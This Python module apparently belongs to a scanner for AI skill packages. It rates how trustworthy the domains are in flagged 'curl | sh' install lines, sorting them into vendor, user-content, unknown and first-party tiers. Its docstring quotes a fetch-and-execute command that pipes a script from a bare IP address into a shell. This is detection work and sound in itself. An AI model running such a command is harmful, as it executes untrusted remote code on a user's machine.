"""Domain reputation for rules that flag fetching and executing remote code.

`curl https://astral.sh/uv/install.sh | sh` and
`curl https://198.51.100.7/x.sh | sh` are the same syntax and very different
claims. Without this, every documented installer in the ecosystem is reported
as critical remote code execution, which is what the 2026-09 corpus scan found.

Two tiers, deliberately not one:

- ``vendor``      the domain belongs to the project shipping the installer.
- ``usercontent`` the host is reputable but the bytes are user-supplied, so the
                  domain is not evidence about the script.

Anything unlisted keeps full severity.
"""

import re
from functools import lru_cache
from pathlib import Path

DOMAIN_FILE = Path(__file__).parent.parent / "data" / "install_domains.txt"

_URL_RE = re.compile(r"https?://([A-Za-z0-9.\-]+)")
_IPV4_RE = re.compile(r"https?://(\d{1,3}(?:\.\d{1,3}){3})")

VENDOR = "vendor"
USERCONTENT = "usercontent"
UNKNOWN = "unknown"


@lru_cache(maxsize=1)
def load_domains(path: Path = DOMAIN_FILE) -> dict[str, str]:
    """Return {domain: tier}. Missing file yields an empty map, not an error."""
    tiers: dict[str, str] = {}
    if not path.exists():
        return tiers
    for raw in path.read_text(encoding="utf-8").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        if len(parts) != 2:
            continue
        tier, domain = parts
        if tier in (VENDOR, USERCONTENT):
            tiers[domain.lower()] = tier
    return tiers


def classify_host(host: str) -> str:
    """Classify a hostname as vendor, usercontent, or unknown.

    A listed domain also matches its subdomains, so ``cdn.astral.sh`` inherits
    ``astral.sh``. Matching is on label boundaries: ``notastral.sh`` does not
    match ``astral.sh``.
    """
    host = host.lower().rstrip(".")
    tiers = load_domains()
    labels = host.split(".")
    for i in range(len(labels)):
        candidate = ".".join(labels[i:])
        tier = tiers.get(candidate)
        if tier:
            return tier
    return UNKNOWN


def classify_text(text: str) -> str:
    """Classify the most severe URL appearing in a line of text.

    A bare IPv4 URL is always ``unknown`` - naming a host by address is the
    opposite of a reputation signal. If a line carries several URLs, the least
    trusted one wins, since that is the one that could carry the payload.
    """
    if _IPV4_RE.search(text):
        return UNKNOWN
    hosts = _URL_RE.findall(text)
    if not hosts:
        return UNKNOWN
    tiers = {classify_host(h) for h in hosts}
    for tier in (UNKNOWN, USERCONTENT, VENDOR):
        if tier in tiers:
            return tier
    return UNKNOWN


FIRST_PARTY = "first-party"


def _tokens(*values: str) -> set[str]:
    """Reduce identifiers to comparable alphanumeric tokens."""
    out = set()
    for v in values:
        if not v:
            continue
        squashed = re.sub(r"[^a-z0-9]", "", v.lower())
        if len(squashed) >= 4:
            out.add(squashed)
    return out


def _registrable_label(host: str) -> str:
    """The distinctive part of a hostname: 'cli.p2claw.com' -> 'p2claw'."""
    labels = [x for x in host.lower().split(".") if x]
    if len(labels) < 2:
        return labels[0] if labels else ""
    # Skip a leading service label (www, cli, cdn, get, download, install).
    generic = {"www", "cli", "cdn", "get", "download", "install", "dl", "static"}
    labels = [x for x in labels if x not in generic] or labels
    return labels[-2] if len(labels) >= 2 else labels[-1]


def is_first_party(text: str, identifiers: set[str]) -> bool:
    """True if a URL in `text` is served from the skill's own domain.

    A skill called ``p2claw`` installing from ``p2claw.com`` is publishing its
    own installer. That is the same claim the vendor list makes, but derived
    rather than enumerated, so it holds for projects nobody has listed. It is
    deliberately weak evidence of *safety* - it only says the skill is not
    pretending the payload comes from somewhere it does not.
    """
    if not identifiers or _IPV4_RE.search(text):
        return False
    for host in _URL_RE.findall(text):
        label = _registrable_label(host)
        if len(label) < 4:
            continue
        for ident in identifiers:
            if label == ident or label in ident or ident in label:
                return True
    return False


def skill_identifiers(skill) -> set[str]:
    """Identity tokens for a skill: its name, slug, publisher, and homepage."""
    fm = skill.metadata.raw_frontmatter or {}
    homepage = ""
    for key in ("homepage", "repository", "url", "website"):
        value = fm.get(key)
        if isinstance(value, str) and value:
            homepage = value
            break
    idents = _tokens(
        skill.metadata.name,
        skill.path.name,
        skill.path.parent.name if skill.path.parent else "",
    )
    if homepage:
        for host in _URL_RE.findall(homepage):
            idents |= _tokens(_registrable_label(host))
    return idents
